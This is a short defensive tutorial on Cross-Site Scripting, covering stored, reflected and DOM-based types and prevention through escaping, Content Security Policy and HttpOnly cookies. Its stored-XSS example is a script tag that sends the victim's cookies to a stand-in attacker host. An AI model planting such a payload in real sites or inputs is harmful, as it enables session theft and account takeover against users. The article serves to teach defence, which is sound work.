Cross-Site Scripting (XSS) remains one of the top web vulnerabilities (OWASP Top 10). It occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.

If an attacker can run JavaScript on your user's browser, they can:
- Steal cookies and session tokens (account takeover).
- Redirect users to phishing sites.
- Perform actions on behalf of the user.

## Types of XSS

### 1. Stored XSS (Persistent)
The malicious script is saved to the specific database (e.g., in a comment field). Every time a user views that comment, the script executes.
- **Example**: A hacker posts a comment: `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`.

### 2. Reflected XSS (Non-Persistent)
The script is embedded in a URL parameter and executed immediately by the server.
- **Example**: `http://example.com/search?q=<script>alert(1)</script>`.

### 3. DOM-Based XSS
The vulnerability exists in the client-side code rather than the server-side code.

## Prevention Checklist

### 1. Escape All User Input
The golden rule: **Never trust user input.**
- Convert special characters into their HTML entities (e.g., `<` becomes `&lt;`).
- Modern frameworks like **React**, **Vue**, and **Angular** do this automatically. This is why using `dangerouslySetInnerHTML` in React is... dangerous.

### 2. Use Content Security Policy (CSP)
CSP is an HTTP header that allows you to safeguard your site by restricting the sources of executable scripts.
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```
This tells the browser: "Only execute scripts from my own domain or this specific CDN."

### 3. HttpOnly Cookies
Store sensitive session tokens in `HttpOnly` cookies. JavaScript cannot access these cookies, meaning even if an XSS attack succeeds, the attacker cannot steal the session token.

## Conclusion
Security is a multilayered approach. By escaping data, using modern frameworks, and implementing CSP, you can effectively neutralize the threat of XSS and keep your users safe.
